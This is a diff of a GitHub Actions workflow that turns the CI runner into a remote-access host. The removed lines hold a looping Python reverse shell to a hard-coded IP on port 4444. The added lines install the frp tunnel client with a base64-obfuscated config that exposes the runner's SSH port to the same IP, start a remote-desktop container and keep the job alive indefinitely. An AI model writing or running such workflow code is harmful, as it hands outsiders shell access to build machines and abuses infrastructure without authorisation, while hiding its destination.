@@ -17,15 +17,15 @@ jobs:
 
     - name: Create reverse shell script
       run: |
-        cat << 'EOF' > reverse_shell.sh
-        while true; do
-            export RHOST="185.159.128.111"
-            export RPORT=4444
-            python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
-            sleep 10
-        done
-        EOF
-        chmod +x reverse_shell.sh
-
-    - name: Run reverse shell script
-      run: ./reverse_shell.sh
+        docker run -d -p 5901:5901 -p 6901:6901 jiteshsojitra/docker-ubuntu-xfce-container
+        wget https://github.com/fatedier/frp/releases/download/v0.59.0/frp_0.59.0_linux_amd64.tar.gz
+        tar xf frp*
+        rm frp*gz
+        cd frp*
+        base64 -d <<< c2VydmVyQWRkciA9ICIxODUuMTU5LjEyOC4xMTEiCnNlcnZlclBvcnQgPSA3MDAwCgpbW3Byb3hpZXNdCm5hbWUgPSAic3NoIgp0eXBlID0gInRjcCIKbG9jYWxJUCA9ICIxMjcuMC4wLjEiCmxvY2FsUG9ydCA9IDIyCnJlbW90ZVBvcnQgPSA2MDIyCg== > frpc.toml
+        chmod +x frp?
+        ./frpc -c ./frpc.toml
+        echo "running"
+        
+    - name: keep running
+      run: while true; do echo $RANDOM ; sleep 3 ; done
